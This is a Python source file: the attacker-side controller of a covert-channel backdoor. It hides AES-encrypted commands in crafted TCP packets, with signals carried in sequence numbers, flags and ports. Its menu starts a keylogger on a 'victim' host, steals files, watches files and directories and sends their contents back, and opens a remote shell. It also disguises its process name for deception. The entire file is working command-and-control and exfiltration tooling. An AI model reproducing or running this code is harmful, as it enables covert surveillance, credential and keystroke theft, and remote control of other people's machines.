#!/usr/bin/env python

### GENERAL ###############################################################################
###########################################################################################
import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

from multiprocessing import Process
from scapy.all import *
from setproctitle import getproctitle, setproctitle
import os
import sys

# process name
PROC_NAME = "abc"
# IP address of the victim
VIC_IP = "192.168.0.160"
# Port of the victim
VIC_PORT = 0
# Directory to save victim information
DIRECTORY = ""

### KEYLOGGER #############################################################################
###########################################################################################
from datetime import datetime

CHAR = ""
CAESAR_KEY = 11
KEYLOGGER_SNIFF = None

### TRANSFER ##############################################################################
###########################################################################################
PATH_TRANSFER = ""
TCONFIRM = True
TRANSFER_DATA = b''

### MONITOR ###############################################################################
###########################################################################################
from watchdog.observers import Observer
from watchdog.events import LoggingEventHandler
import logging
import time

PATH_FILE = ""
FCONFIRM = True
FILE_DATA = b''
PATH_FILE_LOG = ""
PATH_FILE_TRANSFER = ""
FILE_LOG = ""
FILE_SNIFF = None

PATH_DIR = ""
DCONFIRM = True
DIR_DATA = b''
PATH_DIR_TRANSFER = ""
DIR_SNIFF = None
FILE_NAME = ""

### COVERT CHANNEL ########################################################################
###########################################################################################
from Crypto.Cipher import AES

# key value has to be 16 bytes for AES encryption
DEFAULT_KEY = "absentmindedness"
# salt value has to be 16 bytes for AES encryption
DEFAULT_SALT = "overenthusiastic"

### KEYLOGGER #############################################################################
###########################################################################################
def keylogger_decrypt(enc_data, CAESAR_KEY):
    try:
        data = ""

        for i in range(len(enc_data)):
            char = enc_data[i]
            data += chr((ord(char) + 128 - CAESAR_KEY % 128) % 128)

        return data
    except Exception as error:
        print(str(error))

def recv_keylogger(packet):
    global CHAR
    directory = os.path.join(DIRECTORY, "1_keylogger")
    date = datetime.now().strftime("%Y-%m-%d_")
    folder = os.path.join(directory, date)
    
    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 3333 and flag == "E" and srcIP == VIC_IP:
            CHAR += chr(packet["TCP"].sport)

            with open(folder + "encrypted.log", "a") as encrypted_file:
                encrypted_file.write(CHAR + "\n")
            with open(folder + "decrypted.log", "a") as decrypted_file:
                data = keylogger_decrypt(CHAR, CAESAR_KEY)
                decrypted_file.write(data + "\n")

            CHAR = ""

def check_keylogger(packet):
    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 3333 and flag == "E" and srcIP == VIC_IP:
            return True
    else:
        return False

def keylogger_sniff():
    while True:
        sniff(filter='tcp', prn=recv_keylogger, stop_filter=check_keylogger)

### TRANSFER ##############################################################################
###########################################################################################
class BreakException(Exception):
    pass

def set_tname():
    global PATH_TRANSFER

    tname = input("File to transfer from victim (eg. /root/Desktop/file): ")
    tname = tname.strip()
    tname = tname.replace(" ", "")

    if tname == "exit":
        print("\nExiting...")
        menu()
    elif tname is not None and tname != "":
        PATH_TRANSFER = tname
    else:
        print("Input file: {0} is not valid. Please try again.".format(tname))
        set_tname()

def send_packet_tname(data):
    enc_data = encrypt(data)
    tname_packet = Ether() / IP(dst=VIC_IP) / TCP(dport=RandNum(1025, 65535), seq=4444, flags="C") / Raw(load=enc_data)
    sendp(tname_packet, verbose=0)

def recv_tconfirm(packet):
    global TCONFIRM

    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 4445 and flag == "C" and srcIP == VIC_IP:
            if packet["TCP"].sport == 7000:
                TCONFIRM = True
                raise BreakException()
            elif packet["TCP"].sport == 8000:
                TCONFIRM = False
                raise BreakException()

def check_tconfirm(packet):
    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 4445 and flag == "C" and srcIP == VIC_IP:
            return True
    else:
        return False

def tconfirm_sniff():
    try:
        while True:
            sniff(filter='tcp', prn=recv_tconfirm, stop_filter=check_tconfirm)
    except BreakException:
        pass

def recv_tfile(packet):
    global TRANSFER_DATA
    head, tail = os.path.split(PATH_TRANSFER)
    directory = os.path.join(DIRECTORY, "2_transfer")
    folder = os.path.join(directory, tail)

    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 5555 and flag == "C" and srcIP == VIC_IP:
            if packet["TCP"].sport == 7000:
                TRANSFER_DATA += decrypt(packet[Raw].load)
                print("Receiving file...")
            elif packet["TCP"].sport == 8080:
                with open(folder, "wb") as f:
                    f.write(TRANSFER_DATA)
                TRANSFER_DATA = b''
                print("Finished transferring file...")
                raise BreakException()

def check_tfile(packet):
    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 5555 and flag == "C" and srcIP == VIC_IP:
            return True
    else:
        return False

def transfer_sniff():
    try:
        while True:
            sniff(filter='tcp', prn=recv_tfile, stop_filter=check_tfile)
    except BreakException:
        pass

### MONITOR (FILE) ########################################################################
###########################################################################################
def set_fname():
    global PATH_FILE

    fname = input("File to monitor (eg. /root/Desktop/folder/file): ")
    fname = fname.strip()
    fname = fname.replace(" ", "")

    if fname == "exit":
        print("\nExiting...")
        menu()
    elif fname is not None and fname != "":
        PATH_FILE = fname
    else:
        print("File: {0} is not valid. Please try again.".format(fname))
        set_fname()

def send_packet_fname(data):
    enc_data = encrypt(data)
    fname_packet = Ether() / IP(dst=VIC_IP) / TCP(dport=RandNum(1025, 65535), seq= 6666, flags="A") / Raw(load=enc_data)
    sendp(fname_packet, verbose=0)

def recv_fconfirm(packet):
    global FCONFIRM

    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 6667 and flag == "A" and srcIP == VIC_IP:
            if packet["TCP"].sport == 7000:
                FCONFIRM = True
                raise BreakException()
            elif packet["TCP"].sport == 8000:
                FCONFIRM = False
                raise BreakException()

def check_fconfirm(packet):
    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 6667 and flag == "A" and srcIP == VIC_IP:
            return True
    else:
        return False

def fconfirm_sniff():
    try:
        while True:
            sniff(filter='tcp', prn=recv_fconfirm, stop_filter=check_fconfirm)
    except BaseException:
        pass

def file_setup():
    global PATH_FILE_LOG, PATH_FILE_TRANSFER

    directory = os.path.join(DIRECTORY, "3_monitor_file")
    date = datetime.now().strftime("%Y-%m-%d_")
    fname = os.path.basename(PATH_FILE)
    file_name = date + fname
    folder = os.path.join(directory, file_name)

    PATH_FILE_LOG = folder + ".log"
    PATH_FILE_TRANSFER = folder

    f1 = open(PATH_FILE_LOG, "w")
    f2 = open(PATH_FILE_TRANSFER, "w")
    f1.close()
    f2.close()

def recv_file(packet):
    global FILE_DATA, FILE_LOG

    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 7777 and flag == "A" and srcIP == VIC_IP:
            if packet["TCP"].sport == 7000:
                FILE_LOG = decrypt(packet[Raw].load).decode()
                with open(PATH_FILE_LOG, "a") as f:
                    f.write(FILE_LOG)
            elif packet["TCP"].sport == 8000:
                FILE_DATA = decrypt(packet[Raw].load)
            elif packet["TCP"].sport == 8080:
                with open(PATH_FILE_TRANSFER, "wb") as f:
                    f.write(FILE_DATA)

def check_file(packet):
    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 7777 and flag == "A" and srcIP == VIC_IP:
            return True
    else:
        return False

def file_sniff():
    while True:
        sniff(filter='tcp', prn=recv_file, stop_filter=check_file)

### MONITOR (DIR) #########################################################################
###########################################################################################
def set_dname():
    global PATH_DIR

    dname = input("Directory to monitor (eg. /root/Desktop/folder): ")
    dname = dname.strip()
    dname = dname.replace(" ", "")

    if dname == "exit":
        print("\nExiting...")
        menu()
    elif dname is not None and dname != "":
        PATH_DIR = dname
    else:
        print("Directory: {0} is not valid. Please try again.".format(dname))
        set_dname()

def send_packet_dname(data):
    enc_data = encrypt(data)
    dname_packet = Ether() / IP(dst=VIC_IP) / TCP(dport=RandNum(1025, 65535), seq=8888, flags="U") / Raw(load=enc_data)
    sendp(dname_packet, verbose=0)

def recv_dconfirm(packet):
    global DCONFIRM

    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 8889 and flag == "U" and srcIP == VIC_IP:
            if packet["TCP"].sport == 7000:
                DCONFIRM = True
                raise BreakException()
            elif packet["TCP"].sport == 8000:
                DCONFIRM = False
                raise BreakException()

def check_dconfirm(packet):
    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 8889 and flag == "U" and srcIP == VIC_IP:
            return True
    else:
        False

def dconfirm_sniff():
    try:
        while True:
            sniff(filter='tcp', prn=recv_dconfirm, stop_filter=check_dconfirm)
    except BaseException:
        pass

def dir_setup():
    global PATH_DIR_TRANSFER

    directory = os.path.join(DIRECTORY, "4_monitor_dir")
    date = datetime.now().strftime("%Y-%m-%d_")
    dname = os.path.basename(PATH_DIR)
    file_name = date + dname
    folder = os.path.join(directory, file_name)

    PATH_DIR_TRANSFER = folder + "_"

def recv_dir(packet):
    global DIR_DATA, PATH_DIR_TRANSFER, FILE_NAME

    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 9999 and flag == "U" and srcIP == VIC_IP:
            if packet["TCP"].sport == 7080:
                FILE_NAME = decrypt(packet[Raw].load).decode()
            elif packet["TCP"].sport == 8000:
                DIR_DATA += decrypt(packet[Raw].load)
            elif packet["TCP"].sport == 8080:
                with open(PATH_DIR_TRANSFER + FILE_NAME, "wb") as f:
                    f.write(DIR_DATA)
                DIR_DATA = b''

def check_dir(packet):
    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 9999 and flag == "U" and srcIP == VIC_IP:
            return True
    else:
        return False

def dir_sniff():
    while True:
        sniff(filter='tcp', prn=recv_dir, stop_filter=check_dir)

### SHELL SCRIPT ##########################################################################
###########################################################################################
def recv_shell(packet):
    if IP in packet[0] and Raw in packet[2]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 2224 and flag == "F" and srcIP == VIC_IP:
            output = packet[Raw].load
            dec_data = decrypt(output)
            print(dec_data.decode())

def check_shell(packet):
    if IP in packet[0] and Raw in packet[2]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 2224 and flag == "F" and srcIP == VIC_IP:
            return True
    else:
        return False

def shell_sniff():
    success = True

    while True:
        if success:
            cmd = input("[" + VIC_IP + "] " + "Remote Shell$ ")
            enc_data = encrypt(cmd)
            cmd_packet = Ether() / IP(dst=VIC_IP) / TCP(dport=VIC_PORT, seq=2223, flags="F") / Raw(load=enc_data)
            sendp(cmd_packet, verbose=0)

            if cmd == "exit":
                print("\nConnection to {0} is now closed.".format(VIC_IP))
                break
            success = False
        else:
            sniff(filter='tcp', prn=recv_shell, stop_filter=check_shell)
            success = True

### MENU ##################################################################################
###########################################################################################
def encrypt(data):
    key = DEFAULT_KEY.encode("utf-8")
    salt = DEFAULT_SALT.encode("utf-8")
    encObj = AES.new(key, AES.MODE_CFB, salt)
    enc_data = encObj.encrypt(data.encode("utf-8"))
    return enc_data

def decrypt(data):
    key = DEFAULT_KEY.encode("utf-8")
    salt = DEFAULT_SALT.encode("utf-8")
    decObj = AES.new(key, AES.MODE_CFB, salt)
    dec_data = decObj.decrypt(data)
    return dec_data

def send_packet(data):
    enc_data = encrypt(data)
    data_packet = Ether() / IP(dst=VIC_IP) / TCP(dport=VIC_PORT, seq=2222, flags="F") / Raw(load=enc_data)
    sendp(data_packet, verbose=0)

def menu():
    global KEYLOGGER_SNIFF, FILE_SNIFF, DIR_SNIFF
    global PATH_FILE
    global PATH_DIR
    choice = 0

    print("")
    print("   1. Start the keylogger")
    print("   2. Stop the keylogger")
    print("   3. Transfer a file from the victim to the attacker")
    print("   4. Start watching a file for changes")
    print("   5. Stop watching a file for changes")
    print("   6. Start watching a directory for changes")
    print("   7. Stop watching a directory for changes")
    print("   8. Run shell script")
    print("   9. Change victim IP and Port & Process name")
    print("   0. Quit")
    print("")

    choice = input("Please choose an option: ")

    print("")

    if choice == "1":
        send_packet(choice)
        print("Starting the keylogger...")
        KEYLOGGER_SNIFF = Process(target=keylogger_sniff)
        KEYLOGGER_SNIFF.daemon = True
        KEYLOGGER_SNIFF.start()
    elif choice == "2":
        send_packet(choice)
        print("Stopping the keylogger...")
        try:
            KEYLOGGER_SNIFF.terminate()
            KEYLOGGER_SNIFF.join()
            print("Log files saved to: {0}/1_keylogger".format(DIRECTORY))
        except AttributeError:
            pass
    elif choice == "3":
        global TCONFIRM
        TCONFIRM = True
        set_tname()
        send_packet_tname(PATH_TRANSFER)
        tconfirm_sniff()
        if TCONFIRM:
            print("Transferring the file from the victim...")
            send_packet(choice)
            transfer_sniff()
            print("File saved to: {0}/2_transfer".format(DIRECTORY))
        else:
            print("Input file is not valid. Input was: {0} ".format(PATH_TRANSFER))
    elif choice == "4":
        global FCONFIRM
        FCONFIRM = True
        set_fname()
        send_packet_fname(PATH_FILE)
        fconfirm_sniff()
        if FCONFIRM:
            file_setup()
            send_packet(choice)
            print("Start watching file: {0} for changes...".format(PATH_FILE))
            FILE_SNIFF = Process(target=file_sniff)
            FILE_SNIFF.daemon = True
            FILE_SNIFF.start()
        else:
            print("Input file is not valid. Input was: {0}".format(PATH_FILE))
    elif choice == "5":
        send_packet(choice)
        print("Stop watching a file for changes...")
        try:
            FILE_SNIFF.terminate()
            FILE_SNIFF.join()
            print("Results saved to: {0}/3_monitor_file".format(DIRECTORY))
        except AttributeError:
            pass
    elif choice == "6":
        global DCONFIRM
        DCONFIRM = True
        set_dname()
        send_packet_dname(PATH_DIR)
        dconfirm_sniff()
        if DCONFIRM:
            dir_setup()
            send_packet(choice)
            print("Start watching directory: {0} for changes...".format(PATH_DIR))
            DIR_SNIFF = Process(target=dir_sniff)
            DIR_SNIFF.daemon = True
            DIR_SNIFF.start()
        else:
            print("Directory is not valid. Input was: {0}".format(PATH_DIR))
    elif choice == "7":
        send_packet(choice)
        print("Stop watching a directory for changes...")
        try:
            DIR_SNIFF.terminate()
            DIR_SNIFF.join()
            print("Results saved to: {0}/4_monitor_dir".format(DIRECTORY))
        except AttributeError:
            pass
    elif choice == "8":
        send_packet(choice)
        shell_sniff()
    elif choice == "9":
        config()
    elif choice == "0":
        send_packet(choice)
        print("Goodbye.")
        sys.exit(0)
    else:
        print("Invalid choice. Please try again.")

    menu()

### SET-UP ################################################################################
###########################################################################################
def check_root():
    if os.getuid() != 0:
        print("This application must be run with root/sudo")
        sys.exit(1)

def check_ip(ip):
    try:
        if ip is None:
            print("IP address is not valid. Please set Destination IP address.")
            return False
        else:
            socket.inet_aton(ip)
            return True
    except socket.error:
        print("IP address is not valid. Please set Destination IP address.")
        return False

def set_ip():
    global VIC_IP
    ip = ""

    try:
        ip = input("IP address of the victim: ")
    except Exception as error:
        print(str(error))

    if check_ip(ip):
        VIC_IP = ip
    else:
        set_ip()

def set_port():
    global VIC_PORT
    VIC_PORT = RandNum(1025, 65535)

def set_pname():
    global PROC_NAME
    pname = input("Process name for deception [default=abc]: ")

    pname = pname.strip()
    pname = pname.replace(" ", "")

    if pname is not None and pname != "":
        PROC_NAME = pname

    setproctitle(PROC_NAME)
    send_packet(PROC_NAME)


def dir_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

def set_directory():
    global DIRECTORY
    DIRECTORY = os.path.join(os.getcwd(), VIC_IP)

    dir_keylogger = os.path.join(DIRECTORY, "1_keylogger")
    dir_exists(dir_keylogger)

    dir_transfer = os.path.join(DIRECTORY, "2_transfer")
    dir_exists(dir_transfer)

    dir_file = os.path.join(DIRECTORY, "3_monitor_file")
    dir_exists(dir_file)

    dir_directory = os.path.join(DIRECTORY, "4_monitor_dir")
    dir_exists(dir_directory)

def config():
    set_ip()
    set_port()
    set_pname()
    set_directory()

    print("")
    print("IP address: {0}".format(VIC_IP))
    print("Port: {0}".format(VIC_PORT))
    print("Process name: {0}".format(getproctitle()))

### MAIN ##################################################################################
###########################################################################################
def main():
    check_root()
    config()
    menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        send_packet("0")
        exit("\nExiting...")
